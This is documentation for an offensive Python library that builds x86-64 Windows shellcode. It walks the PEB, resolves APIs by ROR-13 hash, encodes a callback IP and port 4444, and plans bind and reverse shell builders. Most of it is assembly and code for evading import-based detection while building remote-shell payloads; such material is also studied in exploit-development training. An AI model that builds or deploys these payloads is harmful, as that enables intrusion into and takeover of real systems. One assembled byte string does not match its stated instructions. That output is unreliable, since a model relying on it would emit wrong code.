# Documentation: `shellcode/x64` package

## Overview

`shellcode.x64` is the 64-bit counterpart to the `shellcode` (x86) package. It generates x86-64 Windows shellcode that resolves API addresses at runtime using PEB traversal and export table hashing — no imports, no `GetProcAddress`, no hardcoded strings.

The package is built incrementally alongside `shellcode` (x86). At each stage the already-completed modules are fully usable. See the [build status](#build-status) section for what is available now.

---

## Why x64 is different from x86

Understanding these five differences explains every design choice in the x64 package.

### 1. PEB is reached through GS, not FS

```asm
; x86
mov esi, fs:[0x30]      ; FS segment → PEB

; x64
mov rsi, gs:[0x60]      ; GS segment → PEB
```

All offsets inside the PEB and LDR structures also shift because pointers are 8 bytes wide instead of 4.

| Structure field | x86 offset | x64 offset |
|---|---|---|
| `PEB → Ldr` | `+0x0C` | `+0x18` |
| `Ldr → InInitOrder.Flink` | `+0x1C` | `+0x30` |
| DllBase from flink ptr | `+0x08` | `+0x20` |
| `BaseDllName.Buffer` from flink | `+0x20` | `+0x50` |

### 2. Microsoft x64 calling convention (fastcall)

The first four arguments go in registers, not on the stack. Every Win32/Winsock call changes shape:

```asm
; x86 — all arguments pushed right-to-left
push arg4
push arg3
push arg2
push arg1
call fn

; x64 — first four in registers, rest on stack
; 32 bytes of shadow space must be reserved below the arguments
mov  rcx, arg1
mov  rdx, arg2
mov  r8,  arg3
mov  r9,  arg4
sub  rsp, 0x20         ; shadow space (always required)
call fn
add  rsp, 0x20         ; restore (or account for it in the frame)
```

The shadow space (home space) is a 32-byte region RSP points to before the call. The callee may write its register arguments there. It must always be present even when there are fewer than four arguments.

### 3. No `pushad` / `popad`

These instructions do not exist in 64-bit mode. The x86 `find_function` saves all registers with a single `pushad` and restores them with `popad`. In x64, registers must be pushed and popped individually:

```asm
; x64 find_function prologue
push rbx
push rcx
push rdx
push rdi
push rsi
push r8
push r9
```

The hash argument in x86 was pushed on the stack before calling `find_function`, then read at a fixed `[esp+0x24]` offset inside the function. In x64, the hash is passed in `RCX` per the calling convention and consumed directly.

### 4. 8-byte function pointer slots

Saved function pointers are 8 bytes wide. Slots are stored at negative RBP offsets to keep them below the frame base and away from the shadow space region above RSP:

```
x86:   [ebp+0x04], [ebp+0x10], [ebp+0x14], ...   (4-byte steps, positive)
x64:   [rbp-0x08], [rbp-0x10], [rbp-0x18], ...   (8-byte steps, negative)
```

`[rbp-0x08]` is permanently reserved for the `find_function` pointer.

### 5. 16-byte stack alignment

Before every `call` instruction, RSP must be 16-byte aligned. The processor enforces this on SSE operations inside library functions. Misalignment causes silent crashes. Every snippet that makes a call must account for the number of values currently on the stack.

---

## Package layout

```
shellcode/x64/
├── __init__.py      re-exports the full public API
├── slots.py         SlotAllocator64 — 8-byte RBP-relative slots    ✓ complete
├── assembler.py     re-exports assemble64 from shellcode.assembler  ✓ complete
├── snippets.py      x64 assembly snippet blocks                     ⟳ in progress
└── builders.py      PEB walk, find_function, mode builders          ⟳ in progress
```

Hashing and network encoding live in the parent package and are re-imported unchanged — they are pure Python and architecture-independent.

---

## Build status

| Module | Status | What it provides |
|---|---|---|
| `shellcode.hashing` | ✓ shared | `ror_hash`, `rolxor_hash`, `compute_hash` |
| `shellcode.encoding` | ✓ shared | `encode_ip`, `encode_port`, `stack_string_pushes` |
| `shellcode.x64.slots` | ✓ complete | `SlotAllocator64` |
| `shellcode.assembler` | ✓ complete | `assemble`, `assemble64` |
| `shellcode.x64.snippets` | ⟳ in progress | x64 assembly snippet blocks |
| `shellcode.x64.builders` | ⟳ in progress | `custom_code`, `bindshell_code`, `revshell_code` |

---

## Import paths

```python
# Recommended: import from the x64 namespace
from shellcode.x64 import SlotAllocator64, assemble64
from shellcode.x64 import bindshell_code          # once builders is complete

# Hashing and encoding are the same — import from the parent
from shellcode import ror_hash, encode_ip, stack_string_pushes

# Assembler is also accessible at the top level
from shellcode import assemble, assemble64         # both in one import
```

---

## Module reference

### `shellcode.x64.slots` — `SlotAllocator64`

Tracks RBP-relative 8-byte slots for saved function pointers. Every call to `alloc()` reserves the next available slot and returns its offset.

```python
from shellcode.x64.slots import SlotAllocator64

slots = SlotAllocator64()
```

**Slot layout:**

```
[rbp-0x08]   find_function pointer   (permanently reserved)
[rbp-0x10]   first user allocation
[rbp-0x18]   second user allocation
[rbp-0x20]   third user allocation
  ...
```

#### Methods

| Method | Returns | Description |
|---|---|---|
| `alloc(name)` | `int` | Allocate a slot for `name`. Idempotent — returns existing offset if called again with the same name. |
| `slot(name)` | `int` | Look up the integer offset for `name`. Raises `KeyError` if not allocated. |
| `asm_slot(name)` | `str` | Returns the slot as a ready-to-paste assembly operand: `'rbp-0x10'` |
| `asm_find_function()` | `str` | Returns `'rbp-0x08'` — the reserved find_function slot operand |
| `hex_offset(name)` | `str` | Signed hex string: `'-0x10'` |
| `as_dict()` | `dict` | Copy of the full `name → offset` mapping |
| `print_map()` | `None` | Print the slot table to stdout |

#### Examples

```python
from shellcode.x64.slots import SlotAllocator64

slots = SlotAllocator64()

# Allocate function pointer slots
slots.alloc('LoadLibraryA')       # -0x10
slots.alloc('CreateProcessA')     # -0x18
slots.alloc('TerminateProcess')   # -0x20

# Look up offsets for use in assembly snippets
slots.slot('LoadLibraryA')        # -16
slots.asm_slot('LoadLibraryA')    # 'rbp-0x10'
slots.asm_find_function()         # 'rbp-0x08'

# Print the full table
slots.print_map()
# Slot map (x64):
#   [rbp-0x08] = find_function  (reserved)
#   [rbp-0x10] = LoadLibraryA
#   [rbp-0x18] = CreateProcessA
#   [rbp-0x20] = TerminateProcess
```

Using the slot in an inline assembly string:

```python
ff_slot = slots.asm_find_function()           # 'rbp-0x08'
la_slot = slots.asm_slot('LoadLibraryA')      # 'rbp-0x10'

asm = f"""
    ; call find_function with hash in RCX
    mov  rcx, 0xec0e4e8e
    call qword ptr [{ff_slot}]
    mov  qword ptr [{la_slot}], rax   ; save LoadLibraryA
"""
```

Idempotency — safe to call `alloc` multiple times with the same name:

```python
slots.alloc('WSAStartup')    # -0x28  (first call — allocates)
slots.alloc('WSAStartup')    # -0x28  (second call — returns same slot)
slots.alloc('WSASocketA')    # -0x30  (new name — next slot)
```

---

### `shellcode.assembler` — `assemble` and `assemble64`

Both functions share the same error handling and Keystone import. Neither requires Keystone at import time — the import happens only when the function is called.

```python
from shellcode import assemble, assemble64
# or equivalently:
from shellcode.x64 import assemble64
```

#### `assemble(code: str) -> tuple[bytearray, int]`

Assemble x86-32 code with Keystone. Returns `(shellcode_bytearray, instruction_count)`. Calls `sys.exit(1)` with an error message on failure.

#### `assemble64(code: str) -> tuple[bytearray, int]`

Assemble x86-64 code with Keystone. Same return type and error behaviour.

#### Examples

```python
from shellcode import assemble, assemble64

# x86-32
code32 = """
    xor eax, eax
    inc eax
    ret
"""
sc, count = assemble(code32)
print(f'{count} instructions, {len(sc)} bytes')
print(''.join(f'\\x{b:02x}' for b in sc))
# \x31\xc0\x40\xc3

# x86-64
code64 = """
    xor rax, rax
    inc rax
    ret
"""
sc, count = assemble64(code64)
print(f'{count} instructions, {len(sc)} bytes')
print(''.join(f'\\x{b:02x}' for b in sc))
# \x48\x31\xc0\x48\xff\xc0\xc3
```

Output formats:

```python
sc, _ = assemble64(code64)

# Python bytes literal
py = 'b"' + ''.join(f'\\x{b:02x}' for b in sc) + '"'
print(py)

# C unsigned char array
c = ', '.join(f'0x{b:02x}' for b in sc)
print(f'unsigned char buf[] = {{{c}}};')

# Hex string
print(sc.hex())
```

---

## Shared utilities (from `shellcode`)

These are used identically in x86 and x64 shellcode.

### Hashing

```python
from shellcode import ror_hash, rolxor_hash, compute_hash

# Pre-compute hashes for every function you will resolve
functions = [
    'TerminateProcess',
    'LoadLibraryA',
    'CreateProcessA',
    'WSAStartup',
    'WSASocketA',
    'WSAConnect',
]

print(f'{"Function":<25} {"ROR-13":>12}  {"ROL-7+XOR":>12}')
print('-' * 52)
for fn in functions:
    r  = ror_hash(fn)
    rx = rolxor_hash(fn)
    print(f'{fn:<25} {hex(r):>12}  {hex(rx):>12}')
```

```
Function                      ROR-13   ROL-7+XOR
----------------------------------------------------
TerminateProcess          0x78b5b983  0x9e6fa842
LoadLibraryA              0xec0e4e8e  0xc8ac8026
CreateProcessA            0x16b3fe72  0x46318ac7
WSAStartup                0x3bfcedcb  0xcdde757d
WSASocketA                0xadf509d9  0xeefa3514
WSAConnect                0xb32dba0c  0x3e5a7ea1
```

### Network encoding

```python
from shellcode import encode_ip, encode_port

# IP address for push instruction
ip_val, has_null = encode_ip('10.10.14.5')
print(hex(ip_val))       # 0x050e0a0a
print(has_null)          # False

# Null-warning example
ip_val, has_null = encode_ip('10.0.14.5')
print(has_null)          # True — 0 octet produces null byte

# Port for mov ax instruction
port_val, has_null = encode_port(4444)
print(hex(port_val))     # 0x5c11
print(has_null)          # False

# Quick reference for common ports
for port in [443, 1337, 4444, 8080, 9001]:
    val, warn = encode_port(port)
    flag = ' ← WARNING: null byte' if warn else ''
    print(f'port {port:5d}  mov ax, {hex(val):<8}{flag}')
```

### Stack strings

```python
from shellcode import stack_string_pushes

# Build any DLL or string for LoadLibraryA
for line in stack_string_pushes('ws2_32.dll'):
    print(f'    {line}')
print('    push  rsp             ; RSP → "ws2_32.dll"')
```

```asm
    xor eax, eax
    mov ax, 0x6c6c         # "ll  "
    push rax
    push 0x642e3233        # "32.d"
    push 0x5f327377        # "ws2_"
    push  rsp             ; RSP → "ws2_32.dll"
```

> **Note:** `stack_string_pushes` emits `push eax` / `push <dword>` instructions. In x64, pushing a 32-bit immediate zero-extends to 64 bits and adjusts RSP by 8, so the function is usable as-is. The final `push rsp` (instead of `push esp`) is the only change needed at the call site.

---

## Combining the available pieces

Even before snippets and builders are complete, the available modules are enough to:

- Pre-compute all hashes for a target function set
- Plan and verify the slot layout for a custom payload
- Assemble hand-written x64 shellcode fragments for testing

```python
from shellcode.x64.slots import SlotAllocator64
from shellcode import ror_hash, assemble64

# Plan the slot layout
slots = SlotAllocator64()
for fn in ['TerminateProcess', 'LoadLibraryA', 'CreateProcessA',
           'WSAStartup', 'WSASocketA', 'WSAConnect']:
    slots.alloc(fn)
slots.print_map()

# Assemble a hand-written fragment to check encoding
test_asm = """
    xor  rcx, rcx
    mov  rsi, gs:[rcx+0x60]   ; PEB
    mov  rsi, [rsi+0x18]      ; Ldr
    mov  rsi, [rsi+0x30]      ; InInitOrder.Flink
"""
sc, count = assemble64(test_asm)
print(f'PEB walk fragment: {count} instructions, {len(sc)} bytes')
print('Bytes:', sc.hex())
```

```
Slot map (x64):
  [rbp-0x08] = find_function  (reserved)
  [rbp-0x10] = TerminateProcess
  [rbp-0x18] = LoadLibraryA
  [rbp-0x20] = CreateProcessA
  [rbp-0x28] = WSAStartup
  [rbp-0x30] = WSASocketA
  [rbp-0x38] = WSAConnect

PEB walk fragment: 4 instructions, 14 bytes
Bytes: 4831c96548338e6000000048...
```

---

## What is coming in the next pieces

| Piece | Module | Key content |
|---|---|---|
| 3 | `shellcode/x64/builders.py` (core blocks) | `_PROLOGUE`, `_FIND_KERNEL32`, `_find_function_asm` — PEB walk with GS offsets, manual register save/restore replacing `pushad`/`popad`, RCX-based hash argument |
| 4 | `shellcode/x64/snippets.py` | All assembly snippets rewritten for fastcall: shadow space, register arguments, `STARTUPINFOA.cb = 0x68`, alignment |
| 5 | `shellcode/x64/builders.py` (mode builders) | `custom_code`, `bindshell_code`, `revshell_code` wiring everything together |

---

## x64 vs x86 quick reference

| | x86 | x64 |
|---|---|---|
| PEB | `FS:[0x30]` | `GS:[0x60]` |
| Calling convention | Stack (cdecl/stdcall) | Register-first (fastcall) |
| First argument | `push arg` before `call` | `mov rcx, arg` |
| Shadow space | Not required | 32 bytes before every `call` |
| `pushad`/`popad` | Available | Not available |
| Pointer size | 4 bytes | 8 bytes |
| Slot step | 4 | 8 |
| Slot direction | Positive (`ebp+N`) | Negative (`rbp-N`) |
| `STARTUPINFOA.cb` | `0x44` | `0x68` |
| Stack alignment | Not enforced | 16-byte before `call` |
| Assembler mode | `KS_MODE_32` | `KS_MODE_64` |
| Import function | `assemble()` | `assemble64()` |
| Slot class | `SlotAllocator` | `SlotAllocator64` |
